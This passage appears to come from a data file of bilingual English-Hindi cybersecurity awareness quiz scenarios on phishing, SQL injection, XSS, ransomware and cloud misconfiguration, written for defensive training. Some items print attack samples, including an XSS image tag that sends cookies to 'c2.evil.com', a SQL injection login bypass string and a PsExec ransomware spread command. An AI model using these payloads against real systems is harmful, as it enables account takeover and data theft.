                ("Malicious: It is a homograph phishing spoof resolving to an unvetted foreign Punycode server", True, "Flawless URL forensics! The '@' symbol redirects the destination to the attacker.", "उत्कृष्ट! यह एक होमोग्राफ फ़िशिंग स्पूफ है।"),
                ("Enter your Apple ID password to test if it works", False, "Hands credentials to the attacker.", "क्रेडेंशियल चोरी हो जाएंगे।")
            ]
        },
        {
            "type": "redirect",
            "sender": "Incoming Marketing Link",
            "subject": "Open Redirect Vulnerability Exploitation",
            "body": "An email links to: `https://legitimate-corp.com/oauth/redirect?next=http://malicious-credential-stealer.xyz/harvest`",
            "is_threat": True,
            "explanation_en": "Open redirects abuse trusted domains to bounce users to external credential harvesters, bypassing basic domain reputation filters.",
            "explanation_hi": "ओपन रीडायरेक्ट में वैध वेबसाइट के पते का दुरुपयोग करके पीड़ित को फर्जी वेबसाइट पर भेजा जाता है।",
            "warning_signs_en": "'next=' or 'return_url=' parameter pointing to an untrusted external domain.",
            "warning_signs_hi": "पैरामीटर में बाहरी संदिग्ध वेबसाइट का लिंक होना।",
            "choices": [
                ("Click freely because legitimate-corp.com has a valid green SSL padlock", False, "The server bounces you immediately to the malicious harvester site.", "वेबसाइट आपको तुरंत फर्जी पेज पर भेज देगी।"),
                ("Reject link: It exploits an open redirect parameter to route users to an external attack site", True, "Master inspection! Always inspect destination query parameters.", "शानदार! गंतव्य पैरामीटर की जांच करना सबसे सही है।"),
                ("Forward to the entire team", False, "Spreads the phishing risk.", "जोखिम बढ़ता है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 14: Browser Security Quest
    # -------------------------------------------------------------------------
    "browser-security-quest": [
        {
            "type": "extension",
            "sender": "Chrome Web Store Prompt",
            "subject": "Suspicious Browser Extension Permission",
            "body": "A free extension 'Quick Screenshot & Tab Manager' prompts for permissions: 'Read and change all your data on all websites you visit' and 'Manage your downloads'.",
            "is_threat": True,
            "explanation_en": "Malicious extensions with broad permissions act as resident keyloggers and session cookie stealers, capturing banking data and passwords as you type.",
            "explanation_hi": "अत्यधिक अनुमतियां मांगने वाले एक्सटेंशन आपके पासवर्ड और कुकीज चुरा सकते हैं।",
            "warning_signs_en": "'Read and change all data on all websites' requested by a simple utility.",
            "warning_signs_hi": "सभी वेबसाइटों का डेटा पढ़ने और बदलने की अनुमति मांगना।",
            "choices": [
                ("Click 'Add Extension' because it has 4 stars", False, "Reviews are easily faked; the extension will harvest your corporate credentials.", "रिव्यू फर्जी हो सकते हैं, यह एक्सटेंशन डेटा चुरा लेगा।"),
                ("Deny and cancel installation: extensions should follow least privilege and never require unrestricted web access", True, "Flawless browser hygiene! Excessive extension permissions pose severe risk.", "शानदार! बेवजह सभी वेबसाइटों का डेटा एक्सेस न दें।"),
                ("Install on all company workstations", False, "Compromises the entire organization.", "पूरा संगठन खतरे में।")
            ]
        },
        {
            "type": "download",
            "sender": "Automatic Browser Download",
            "subject": "Drive-by Download .ISO File",
            "body": "While browsing a technical article, a file named `Document_Viewer_Update.iso` downloads automatically without user interaction.",
            "is_threat": True,
            "explanation_en": "ISO files bypass Mark-of-the-Web (MotW) security controls in older Windows systems, packing hidden executables and LNK shortcuts to execute malware upon mounting.",
            "explanation_hi": "ऑटोमैटिक डाउनलोड होने वाली .ISO फाइलें विंडोज सुरक्षा को बायपास करने का प्रयास करती हैं।",
            "warning_signs_en": "Unsolicited automatic download, disk image format (.iso) for a document reader.",
            "warning_signs_hi": "बिना क्लिक किए डाउनलोड, संदिग्ध .iso फाइल।",
            "choices": [
                ("Double-click the .iso file to mount and run the setup", False, "Mounts virtual container and triggers malicious LNK/DLL sideloading.", "कंप्यूटर में तुरंत वायरस लोड हो जाएगा।"),
                ("Do not open; delete the file immediately and clear browser download cache", True, "Spot on! Drive-by downloads must be discarded without mounting or running.", "बिल्कुल सही! फाइल को खोले बिना तुरंत हटा दें।"),
                ("Rename the file to .mp3 and listen to it", False, "Pointless and risky.", "अनुपयोगी।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 15: SQL Injection Shield
    # -------------------------------------------------------------------------
    "sql-injection-shield": [
        {
            "type": "code_review",
            "sender": "Backend Security Audit",
            "subject": "Vulnerable Dynamic SQL Construction",
            "body": "Inspect this Python backend authentication query:\n\n`cursor.execute(f\"SELECT * FROM users WHERE username = '{user}' AND password = '{pass}'\")`\n\nAttacker input: `' OR '1'='1' --`",
            "is_threat": True,
            "explanation_en": "String interpolation in SQL queries causes classic SQL Injection (SQLi), allowing attackers to bypass authentication and dump the entire user database.",
            "explanation_hi": "स्ट्रिंग कॉनकेटनेशन से एसक्यूएल इंजेक्शन होता है, जिससे हमलावर बिना पासवर्ड के लॉगिन कर लेते हैं।",
            "warning_signs_en": "Direct f-string concatenation of user input into raw database SQL commands.",
            "warning_signs_hi": "यूजर इनपुट को सीधे एसक्यूएल क्वेरी में जोड़ना।",
            "choices": [
                ("Safe: Single quotes in the f-string prevent code execution", False, "The input closes the quote and injects boolean tautology `'1'='1'`.", "सिंगल कोट बंद होकर 1=1 का इंजेक्शन हो जाएगा।"),
                ("Vulnerable: Refactor immediately to parameterized queries: `cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (user, hashed_pass))`", True, "Master defensive coding! Parameterization treats user input strictly as data, never code.", "शानदार! पैरामीटराइज्ड क्वेरी ही एसक्यूएल इंजेक्शन का सही समाधान है।"),
                ("Filter out only the word 'admin' from username", False, "Bypassed easily using SQL wildcard syntax.", "आसानी से बायपास हो जाता है।")
            ]
        },
        {
            "type": "architecture",
            "sender": "Database Defense Layer",
            "subject": "Defense-in-Depth for Database Tier",
            "body": "Besides parameterized queries, which principle prevents an attacker from dropping tables even if a secondary SQL injection vulnerability exists?",
            "is_threat": False,
            "explanation_en": "Principle of Least Privilege applied to database users: Web applications should connect using accounts restricted strictly to SELECT, INSERT, UPDATE, with zero DDL permissions (DROP, ALTER).",
            "explanation_hi": "डेटाबेस यूजर को केवल आवश्यक अनुमतियां (SELECT, INSERT) दें, DROP या ALTER नहीं।",
            "warning_signs_en": "Web applications connecting as database 'root' or 'sa' superusers.",
            "warning_signs_hi": "वेबसाइट का डेटाबेस से 'root' या 'sa' के रूप में कनेक्ट होना।",
            "choices": [
                ("Run the web app as database 'sa' (System Administrator) superuser", False, "Allows complete database destruction upon any injection.", "एक छोटी सी गलती से पूरा डेटाबेस डिलीट हो सकता है।"),
                ("Enforce least privilege database user roles, disabling DROP/ALTER and administrative stored procedures", True, "Flawless defense-in-depth! Restricts blast radius even if code is vulnerable.", "बिल्कुल सही! सीमित यूजर रोल से नुकसान का दायरा सीमित रहता है।"),
                ("Disable database backups to save disk space", False, "Disastrous practice.", "विनाशकारी कदम।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 16: XSS Defender
    # -------------------------------------------------------------------------
    "xss-defender": [
        {
            "type": "web_security",
            "sender": "Web Application Penetration Test",
            "subject": "Stored Cross-Site Scripting (XSS) in Comments",
            "body": "A blog comment contains: `<img src=x onerror=\"fetch('https://c2.evil.com/steal?cookie='+document.cookie)\">`. The backend renders this directly with `innerHTML`.",
            "is_threat": True,
            "explanation_en": "Stored XSS executes JavaScript in every visitor's browser session, transmitting session cookies and allowing account takeovers.",
            "explanation_hi": "स्टोर्ड एक्सएसएस से हर विजिटर के ब्राउज़र में खतरनाक स्क्रिप्ट चलती है और कुकीज चोरी हो जाती हैं।",
            "warning_signs_en": "Raw user input rendered via `innerHTML` without HTML entity encoding, `onerror` event injection.",
            "warning_signs_hi": "यूजर इनपुट को बिना एन्कोडिंग के innerHTML में दिखाना।",
            "choices": [
                ("Safe: Modern browsers block JavaScript inside image tags", False, "The onerror handler executes reliably across all modern browsers.", "onerror हैंडलर तुरंत जावास्क्रिप्ट चला देगा।"),
                ("Vulnerable: Use context-aware HTML entity encoding, set `textContent`, and configure HttpOnly cookie flags", True, "Master XSS defense! HttpOnly cookies prevent script access even if XSS occurs.", "शानदार! HTML एन्कोडिंग और HttpOnly कुकीज एक्सएसएस से बचाते हैं।"),
                ("Blacklist only the word 'script'", False, "Trivially bypassed using SVG, IMG, or IFRAME tags.", "अन्य टैग्स से आसानी से बायपास हो जाता है।")
            ]
        },
        {
            "type": "headers",
            "sender": "HTTP Security Headers Audit",
            "subject": "Content Security Policy (CSP) Enforcement",
            "body": "Which HTTP header instruction effectively neutralizes inline XSS scripts across the application?",
            "is_threat": False,
            "explanation_en": "`Content-Security-Policy: default-src 'self'; script-src 'self'` restricts script execution strictly to verified first-party files, rejecting unvetted inline scripts.",
            "explanation_hi": "कंटेंट सिक्योरिटी पॉलिसी (CSP) इनलाइन स्क्रिप्ट को चलने से रोकती है।",
            "warning_signs_en": "Absence of CSP headers allows arbitrary external script injection.",
            "warning_signs_hi": "सीएसपी हेडर न होने से बाहरी स्क्रिप्ट आसानी से चल जाती हैं।",
            "choices": [
                ("Access-Control-Allow-Origin: *", False, "Relates to CORS, does not mitigate XSS.", "यह सिर्फ CORS से संबंधित है।"),
                ("Content-Security-Policy: default-src 'self'; script-src 'self' (disallowing 'unsafe-inline')", True, "Spot on! Strict CSP acts as a decisive second line of defense against XSS.", "बिल्कुल सही! कड़ा सीएसपी हेडर इनलाइन स्क्रिप्ट को ब्लॉक करता है।"),
                ("X-Powered-By: PHP/8.1", False, "Leaks server technology information.", "सर्वर की जानकारी लीक करता है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 17: Network Guardian
    # -------------------------------------------------------------------------
    "network-guardian": [
        {
            "type": "network_traffic",
            "sender": "Core Switch Telemetry: Zeek / Wireshark",
            "subject": "ARP Spoofing / Poisoning Attack",
            "body": "Network monitor detects: Host MAC `00:1A:2B:3C:4D:5E` is broadcasting gratuitous ARP replies claiming it owns the Default Gateway IP `192.168.1.1`.",
            "is_threat": True,
            "explanation_en": "ARP spoofing tricks local subnet workstations into sending all traffic through the attacker's NIC, enabling local Man-in-the-Middle traffic sniffing.",
            "explanation_hi": "एआरपी स्पूफिंग से हमलावर लोकल नेटवर्क का सारा डेटा अपनी तरफ मोड़ लेता है।",
            "warning_signs_en": "Multiple conflicting MAC addresses claiming the default gateway IP, gratuitous ARP flood.",
            "warning_signs_hi": "गेटवे आईपी के लिए बार-बार नकली मैक एड्रेस बदलना।",
            "choices": [
                ("Ignore as normal DHCP renewal traffic", False, "The attacker is sniffing all unencrypted passwords and credentials on the LAN.", "हमलावर सारा लोकल ट्रैफिक देख रहा है।"),
                ("Deploy Dynamic ARP Inspection (DAI) and DHCP Snooping on managed access switches, and isolate the rogue MAC", True, "Flawless network defense! Dynamic ARP Inspection neutralizes ARP poisoning.", "शानदार! स्विच पर डायनेमिक एआरपी इंस्पेक्शन सक्षम करें।"),
                ("Unplug all network cables from the walls permanently", False, "Disrupts the entire business without fixing switch config.", "व्यापार ठप हो जाएगा।")
            ]
        },
        {
            "type": "dns_telemetry",
            "sender": "DNS Firewall & Sinkhole Logs",
            "subject": "DNS Tunneling Exfiltration Anomaly",
            "body": "A single internal machine is issuing 4,000 queries per minute to subdomains formatted like: `4d656d6f7279...exfil.attacker-c2.net`.",
            "is_threat": True,
            "explanation_en": "DNS tunneling encodes confidential files into hex/base64 strings inside DNS lookup queries, bypassing traditional web content proxies.",
            "explanation_hi": "डीएनएस टनलिंग में डेटा को डीएनएस क्वेरी के रूप में चुपके से बाहर भेजा जाता है।",
            "warning_signs_en": "High query frequency, massive domain entropy, unusually long subdomain strings.",
            "warning_signs_hi": "असामान्य रूप से लंबे सबडोमेन, बहुत तेज गति से डीएनएस क्वेरी।",
            "choices": [
                ("Allow traffic because DNS (UDP port 53) is always legitimate", False, "Confidential trade secrets are being stolen via DNS lookups.", "गोपनीय डेटा बाहर भेजा जा रहा है।"),
                ("Block the destination domain via DNS Sinkhole, rate-limit UDP 53, and isolate the compromised source endpoint", True, "Master network forensics! DNS sinkholing halts covert channel exfiltration.", "उत्कृष्ट! डोमेन को ब्लॉक करें और मशीन को अलग करें।"),
                ("Change your computer desktop wallpaper", False, "Completely useless.", "अनुपयोगी।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 19: Ransomware Rescue Team
    # -------------------------------------------------------------------------
    "ransomware-rescue": [
        {
            "type": "incident",
            "sender": "Active Directory Infrastructure Alarm",
            "subject": "Ransomware Lateral Movement via PsExec",
            "body": "Adversary is executing `PsExec.exe -u Administrator -p Password123 \\\\* -c ransomware.exe` across 14 server nodes simultaneously.",
            "is_threat": True,
            "explanation_en": "Attackers leverage compromised domain admin credentials to push ransomware payloads across all reachable nodes using built-in administrative tools.",
            "explanation_hi": "हमलावर एडमिन पासवर्ड से सभी सर्वरों पर एक साथ रैनसमवेयर फैला रहे हैं।",
            "warning_signs_en": "Broadcast PsExec execution, simultaneous child processes across all server nodes.",
            "warning_signs_hi": "सभी सर्वरों पर एक साथ अज्ञात प्रोसेस निष्पादन।",
            "choices": [
                ("Wait until encryption finishes and negotiate the ransom discount", False, "Never negotiate without exhausting recovery; funds criminal infrastructure.", "अपराधियों को बढ़ावा मिलता है।"),
                ("Trigger emergency network isolation at the core switch level, disable compromised domain admin accounts, and sever inter-VLAN routing", True, "Decisive incident command! Halts the lateral encryption firestorm.", "उत्कृष्ट! कोर स्विच से नेटवर्क अलग करें और एडमिन खाते तुरंत बंद करें।"),
                ("Reboot all servers immediately", False, "Accelerates reboot-triggered encryption services.", "खतरा बढ़ सकता है।")
            ]
        },
        {
            "type": "recovery",
            "sender": "Storage Engineering Team",
            "subject": "Restoring from Immutable Air-Gapped Backups",
            "body": "Primary SAN storage is encrypted. What guarantees that backup snapshots have not also been wiped by the ransomware operator?",
            "is_threat": False,
            "explanation_en": "Immutable / WORM (Write Once, Read Many) storage with separate out-of-band credentials prevents ransomware operators from deleting recovery points.",
            "explanation_hi": "इम्यूटिएबल (अपरिवर्तनीय) और ऑफलाइन बैकअप को रैनसमवेयर नष्ट नहीं कर सकता।",
            "warning_signs_en": "Online backups sharing domain admin credentials with encrypted hosts will be deleted first by attackers.",
            "warning_signs_hi": "समान पासवर्ड वाले ऑनलाइन बैकअप सबसे पहले डिलीट कर दिए जाते हैं।",
            "choices": [
                ("Backups stored on the same C: drive as the operating system", False, "Encrypted immediately along with the OS.", "साथ में ही एन्क्रिप्ट हो जाएंगे।"),
                ("Air-gapped, immutable WORM backups managed by a distinct, isolated identity provider", True, "Perfect resilience architecture! Guarantees zero-ransom business restoration.", "शानदार! अलग पहचान वाले ऑफलाइन इम्यूटिएबल बैकअप सुरक्षित रहते हैं।"),
                ("Saving files in the Windows Recycle Bin", False, "Not a backup solution.", "बैकअप नहीं है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 21: Incident Commander
    # -------------------------------------------------------------------------
    "incident-commander": [
        {
            "type": "governance",
            "sender": "Legal & Regulatory Compliance",
            "subject": "Mandatory Statutory Data Breach Notification",
            "body": "Forensics confirms 120,000 customer banking records were exfiltrated during a cyber incident. What is the Incident Commander's regulatory obligation?",
            "is_threat": False,
            "explanation_en": "Data privacy laws (CERT-In 6-hour requirement, GDPR 72-hour requirement, DPDP Act) mandate timely disclosure to regulators and affected individuals.",
            "explanation_hi": "डेटा लीक होने पर सरकारी एजेंसियों (जैसे CERT-In) को तय समय सीमा में सूचित करना कानूनी रूप से अनिवार्य है।",
            "warning_signs_en": "Concealing breaches leads to severe criminal fines, personal liability, and total loss of corporate license.",
            "warning_signs_hi": "डेटा चोरी को छुपाने पर भारी जुर्माना और कानूनी कार्रवाई हो सकती है।",
            "choices": [
                ("Conceal the breach and instruct employees never to mention it", False, "Severe violation carrying massive financial and criminal penalties.", "गंभीर कानूनी अपराध।"),
                ("Notify regulatory authorities (e.g. CERT-In / Data Protection Board) within mandated statutory deadlines with accurate forensic findings", True, "Master regulatory governance! Transparent reporting fulfills legal mandates.", "बिल्कुल सही! समय सीमा के भीतर आधिकारिक एजेंसियों को सूचित करें।"),
                ("Blame an intern on public Twitter", False, "Unprofessional and legally damaging.", "अनुचित व्यवहार।")
            ]
        },
        {
            "type": "comms",
            "sender": "Media & Public Relations Desk",
            "subject": "Crisis Communication Strategy",
            "body": "Journalists are calling customer service asking about rumors of an active security incident. How should communications be handled?",
            "is_threat": False,
            "explanation_en": "All external crisis communications must be centralized through authorized public relations and legal spokespersons with verified facts.",
            "explanation_hi": "संकट के समय सभी बयान अधिकृत प्रवक्ता और कानूनी टीम के माध्यम से ही दिए जाने चाहिए।",
            "warning_signs_en": "Uncoordinated employee statements lead to conflicting misinformation and legal liability.",
            "warning_signs_hi": "कर्मचारियों द्वारा सोशल मीडिया पर अनधिकृत बयान देने से भ्रम फैलता है।",
            "choices": [
                ("Allow every employee to answer journalist questions with their personal opinions", False, "Creates chaotic misinformation and stock market panic.", "अफवाहें और भ्रम फैलेगा।"),
                ("Direct all media inquiries to the dedicated corporate communications spokesperson with approved, legally vetted statements", True, "Flawless crisis management! Centralized communication prevents speculation.", "शानदार! केवल अधिकृत प्रवक्ता ही सत्यापित जानकारी देंगे।"),
                ("Deny that the company uses computers", False, "Absurd response.", "हास्यास्पद।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 24: Data Privacy Guardian
    # -------------------------------------------------------------------------
    "data-privacy-guardian": [
        {
            "type": "classification",
            "sender": "Data Governance Office",
            "subject": "Data Classification & Public Cloud Storage",
            "body": "A developer uploads a database export `prod_users_ssn_passwords.csv` to a newly created AWS S3 bucket with default 'Public Read' permissions.",
            "is_threat": True,
            "explanation_en": "Publicly exposed cloud storage containing Personally Identifiable Information (PII) violates GDPR, DPDP, and HIPAA regulations.",
            "explanation_hi": "क्लाउड स्टोरेज बकेट को पब्लिक रखने से संवेदनशील व्यक्तिगत डेटा इंटरनेट पर लीक हो जाता है।",
            "warning_signs_en": "Public read ACLs on buckets containing production PII data.",
            "warning_signs_hi": "सार्वजनिक रूप से खुला एस3 बकेट।",
            "choices": [
                ("Leave public so developers don't have to authenticate to download it", False, "Global scrapers will index and leak the data within minutes.", "डेटा कुछ ही मिनटों में चोरी हो जाएगा।"),
                ("Apply AWS 'Block Public Access', enforce server-side encryption (KMS), and restrict access strictly to IAM roles with MFA", True, "Master cloud privacy! Never expose internal PII datasets to the public internet.", "उत्कृष्ट! पब्लिक एक्सेस तुरंत बंद करें और एन्क्रिप्शन लागू करें।"),
                ("Change the filename to secret.csv and leave it public", False, "Security through obscurity fails completely.", "नाम बदलने से सुरक्षा नहीं मिलती।")
            ]
        },
        {
            "type": "minimization",
            "sender": "Product Design Review",
            "subject": "Principle of Data Minimization",
            "body": "A simple mobile calculator app requests user permissions for: Camera, Contacts list, Precise GPS location, and SMS reading.",
            "is_threat": True,
            "explanation_en": "Data Minimization requires collecting ONLY the data strictly necessary for application functionality. Excessive permissions indicate spyware.",
            "explanation_hi": "डेटा मिनिमाइजेशन नियम के अनुसार ऐप को केवल जरूरी अनुमतियां ही मांगनी चाहिए।",
            "warning_signs_en": "Calculator app demanding access to contacts, SMS, and geolocation.",
            "warning_signs_hi": "कैलकुलेटर ऐप द्वारा कॉन्टैक्ट्स और एसएमएस की मांग।",
            "choices": [
                ("Grant all permissions because the app is free", False, "Your private messages and contacts will be uploaded to data brokers.", "आपका निजी डेटा बिक जाएगा।"),
                ("Reject permissions and uninstall: a calculator requires zero access to contacts, SMS, or camera", True, "Spot on! Protect personal privacy by enforcing data minimization.", "बिल्कुल सही! अनावश्यक अनुमतियां कभी न दें, ऐप हटाएं।"),
                ("Send your contact list to the developer via email", False, "Worsens the privacy violation.", "गोपनीयता का हनन।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 25: Backup and Recovery Mission
    # -------------------------------------------------------------------------
    "backup-recovery-mission": [
        {
            "type": "backup_rule",
            "sender": "Business Continuity Planning",
            "subject": "Gold Standard 3-2-1 Backup Strategy",
            "body": "What does the industry standard 3-2-1 backup architecture require?",
            "is_threat": False,
            "explanation_en": "3 copies of critical data, on 2 different media formats (e.g. disk and tape/cloud), with at least 1 copy stored securely offsite.",
            "explanation_hi": "3-2-1 नियम: डेटा की 3 कॉपियां, 2 अलग माध्यमों पर, और 1 कॉपी किसी अन्य स्थान (ऑफसाइट) पर होनी चाहिए।",
            "warning_signs_en": "Keeping all backup copies in the same server rack makes them vulnerable to fire, flood, or local ransomware.",
            "warning_signs_hi": "सारे बैकअप एक ही जगह रखने से आग या बाढ़ में सब नष्ट हो सकता है।",
            "choices": [
                ("1 copy on a USB stick kept on your desk", False, "Single point of failure.", "एकल विफलता बिंदु।"),
                ("3 total copies of data, across 2 different storage media types, with 1 copy held offsite / immutable", True, "Flawless backup resilience! The gold standard of disaster recovery.", "शानदार! 3-2-1 नियम आपदा से बचाव का सबसे पक्का तरीका है।"),
                ("Print out all database rows on paper", False, "Impractical and unsearchable.", "अव्यावहारिक।")
            ]
        },
        {
            "type": "drill",
            "sender": "Disaster Recovery Testing",
            "subject": "Scheduled Restoration Drills",
            "body": "An organization has been generating automated daily backups for 3 years, but has never attempted a test restoration drill. What is the risk?",
            "is_threat": True,
            "explanation_en": "A backup that has never been restored is an illusion. Undetected corruption, missing cryptographic keys, or software mismatches cause disaster.",
            "explanation_hi": "बिना रीस्टोर टेस्ट किए गए बैकअप अक्सर जरूरत के समय काम नहीं करते (करप्ट निकलते हैं)।",
            "warning_signs_en": "Assuming backups work without conducting regular verified test restorations.",
            "warning_signs_hi": "बैकअप रीस्टोर का कभी अभ्यास न करना।",
            "choices": [
                ("Zero risk: If the backup script exited with code 0, restoration is 100% guaranteed", False, "Silent data corruption and missing keys are only discovered during active restore.", "साइलेंट करप्शन का पता रीस्टोर के समय ही चलता है।"),
                ("High vulnerability: Schedule quarterly test restorations to isolated sandbox environments to prove recovery validity", True, "Spot on! Regular test drills guarantee Recovery Point (RPO) and Recovery Time (RTO) objectives.", "बिल्कुल सही! नियमित रीस्टोर अभ्यास से बैकअप की सत्यता प्रमाणित होती है।"),
                ("Delete old backups so tests are not needed", False, "Destroys historical recovery records.", "रिकवरी डेटा खत्म।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 26: Cloud Misconfiguration Hunt
    # -------------------------------------------------------------------------
    "cloud-misconfiguration-hunt": [
        {
            "type": "security_group",
            "sender": "Cloud Security Posture Management (CSPM)",
            "subject": "Insecure Security Group Inbound Rule",
            "body": "CSPM alert: AWS Security Group rule allows inbound `0.0.0.0/0` on TCP Port 22 (SSH) and TCP Port 3389 (RDP) directly to production database servers.",
            "is_threat": True,
            "explanation_en": "Exposing SSH/RDP ports directly to the public internet invites automated brute force, credential stuffing, and zero-day exploit scanners.",
            "explanation_hi": "इंटरनेट के लिए पोर्ट 22 या 3389 खुला छोड़ने से सर्वर पर लगातार हैकिंग हमले होते हैं।",
            "warning_signs_en": "Inbound 0.0.0.0/0 open to administrative ports.",
            "warning_signs_hi": "पूरी दुनिया के लिए एडमिन पोर्ट खुला होना।",
            "choices": [
                ("Allow it so administrators can work from hotels without VPN", False, "Leaves critical infrastructure defenseless against automated botnet scans.", "बॉटनेट्स आसानी से हमला कर सकते हैं।"),
                ("Revoke 0.0.0.0/0; restrict management access strictly to corporate VPN subnets or AWS Systems Manager (SSM) Session Manager", True, "Master cloud hardening! Eliminates public exposure of administrative ports.", "उत्कृष्ट! केवल कॉर्पोरेट वीपीएन या सुरक्षित टनल से ही एक्सेस दें।"),
                ("Change SSH port from 22 to 2222 and leave it open to 0.0.0.0/0", False, "Port scanners detect non-standard SSH ports in seconds.", "पोर्ट स्कैनर इसे तुरंत खोज लेते हैं।")
            ]
        },
        {
            "type": "git_leak",
            "sender": "GitHub Secret Scanning Alert",
            "subject": "Exposed Cloud API Keys in Git Repository",
            "body": "A developer committed `AKIAIOSFODNN7EXAMPLE` with master cloud admin permissions to a public GitHub repository 10 minutes ago.",
            "is_threat": True,
            "explanation_en": "Dark web bots scan public GitHub commits in real time, consuming compromised cloud keys within minutes to launch massive GPU cryptomining rigs.",
            "explanation_hi": "गिटहब पर लीक हुई एपीआई कुंजियों का उपयोग करके हैकर्स कुछ ही मिनटों में लाखों का बिल बना देते हैं।",
            "warning_signs_en": "Hardcoded long-lived cloud access keys in source control.",
            "warning_signs_hi": "सोर्स कोड में सीधे एडमिन एपीआई की लिख देना।",
            "choices": [
                ("Delete the commit from GitHub and assume nobody saw it", False, "Bots scrape git commits instantly; the key is already compromised.", "बॉट पहले ही की चुरा चुके होते हैं।"),
                ("Deactivate and delete the exposed key in AWS IAM immediately, audit CloudTrail logs for unauthorized resources, and rotate credentials", True, "Flawless incident response! Immediate key invalidation stops unauthorized billing.", "शानदार! तुरंत की डीएक्टिवेट करें और ऑडिट लॉग जांचें।"),
                ("Email AWS support asking them not to bill you", False, "Fails to stop active resource deployment.", "कुंजी बंद करना जरूरी है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 27: Insider Threat Investigation
    # -------------------------------------------------------------------------
    "insider-threat-investigation": [
        {
            "type": "dlp",
            "sender": "Data Loss Prevention (DLP) Sensor",
            "subject": "Unusual Massive Data Exfiltration before Resignation",
            "body": "A senior engineer who tendered their 2-week resignation notice yesterday downloaded 85GB of proprietary patent blueprints to a personal USB drive at 11:45 PM.",
            "is_threat": True,
            "explanation_en": "Departing employees taking intellectual property to competitors is the most frequent insider threat scenario. DLP alerts require rapid containment.",
            "explanation_hi": "इस्तीफा देने वाले कर्मचारी द्वारा बड़ी मात्रा में डेटा डाउनलोड करना इनसाइडर थ्रेट का स्पष्ट संकेत है।",
            "warning_signs_en": "Massive bulk download outside business hours immediately following resignation notice.",
            "warning_signs_hi": "इस्तीफे के बाद रात में भारी मात्रा में डेटा डाउनलोड।",
            "choices": [
                ("Ignore because they are a trusted senior engineer", False, "Allows theft of proprietary intellectual property.", "कंपनी की बौद्धिक संपदा चोरी हो जाएगी।"),
                ("Alert Legal and Human Resources, freeze user access tokens, and preserve workstation forensic audit logs", True, "Master insider threat mitigation! Protects organizational intellectual property.", "उत्कृष्ट! लीगल टीम को बताएं और तुरंत एक्सेस फ्रीज करें।"),
                ("Ask the engineer to email you a copy of the blueprints", False, "Aids in the unauthorized distribution.", "गंभीर भूल।")
            ]
        },
        {
            "type": "audit_logs",
            "sender": "Database Access Monitor",
            "subject": "Privilege Abuse: Snooping on Executive Records",
            "body": "A database administrator with legitimate access query tools is found running queries against the executive compensation and healthcare records table without any business ticket.",
            "is_threat": True,
            "explanation_en": "Insiders abusing legitimate privileges to snoop on confidential records violate privacy regulations and internal codes of conduct.",
            "explanation_hi": "बिना काम के गोपनीय वेतन या स्वास्थ्य रिकॉर्ड देखना विशेषाधिकार का दुरुपयोग है।",
            "warning_signs_en": "Querying sensitive PII tables without corresponding approved change/support tickets.",
            "warning_signs_hi": "बिना टिकट के गोपनीय वेतन रिकॉर्ड की जांच।",
            "choices": [
                ("Allow it since DBAs have root access anyway", False, "Fails basic segregation of duties and access accountability.", "जवाबदेही का अभाव।"),
                ("Enforce dual-authorization access controls, mask sensitive salary columns, and initiate internal compliance investigation", True, "Spot on! Even privileged accounts must be subject to audit oversight and column masking.", "बिल्कुल सही! संवेदनशील डेटा पर मास्किंग और ऑडिट अनिवार्य है।"),
                ("Delete the database audit logs to protect the DBA", False, "Complicity in compliance violations.", "सबूत मिटाना गलत है।")
            ]
        }
    ],

    # -------------------------------------------------------------------------
    # Game 28: Secure Coding Challenge
    # -------------------------------------------------------------------------
    "secure-coding-challenge": [
        {
            "type": "hashing",
            "sender": "Cryptographic Architecture Review",
            "subject": "Secure Password Storage Algorithm",
            "body": "A developer stores user passwords in the database using `hashlib.md5(password.encode()).hexdigest()`. Why is this dangerous?",
            "is_threat": True,
            "explanation_en": "MD5 and SHA-1 have zero computational work factor. Precomputed rainbow tables and modern GPUs can crack billions of MD5 hashes per second.",
            "explanation_hi": "MD5 बहुत कमजोर है और इसे सेकंडों में क्रैक किया जा सकता है। Argon2id या bcrypt का उपयोग करें।",
            "warning_signs_en": "Using legacy fast hash functions (MD5, SHA1) without salt or memory-hardness for credentials.",
            "warning_signs_hi": "कमजोर और पुराने एल्गोरिदम (MD5) का उपयोग।",
            "choices": [
                ("Safe: MD5 produces a 32-character hexadecimal string that cannot be reversed mathematically", False, "Rainbow tables reverse unsalted MD5 hashes in less than a millisecond.", "रेनबो टेबल से एक मिलीसेकंड में रिवर्स हो जाता है।"),
                ("Vulnerable: Migrate immediately to memory-hard adaptive hashing algorithms: Argon2id or bcrypt with unique cryptographic salts", True, "Master cryptographic hygiene! Argon2id resists GPU/ASIC brute force.", "शानदार! Argon2id या bcrypt ही पासवर्ड सुरक्षित रखने का सही तरीका है।"),
                ("Encrypt with a secret key stored inside the HTML frontend", False, "Exposes the key to anyone viewing page source.", "की आसानी से चोरी हो जाएगी।")
            ]
        },
        {
            "type": "idor",
            "sender": "API Security Audit",
            "subject": "Insecure Direct Object Reference (IDOR)",
            "body": "An API endpoint `/api/v1/invoices?id=104` returns invoice #104. When user 104 changes the parameter to `id=105`, the API returns user 105's private invoice.",
            "is_threat": True,
            "explanation_en": "IDOR occurs when an application provides direct access to objects based on user-supplied input without server-side authorization checks.",
            "explanation_hi": "आईडीओआर में केवल आईडी बदलकर दूसरों का निजी डेटा देखा जा सकता है, क्योंकि सर्वर पर ओनरशिप चेक नहीं होता।",
            "warning_signs_en": "Sequential database IDs exposed in URLs without validating caller ownership.",
            "warning_signs_hi": "यूआरएल में आईडी बदलने पर दूसरों का डेटा दिखना।",
            "choices": [
                ("Normal behavior: The user simply asked for a different invoice number", False, "Violates authorization; exposes every customer invoice to harvesting.", "सभी ग्राहकों का डेटा लीक हो जाएगा।"),
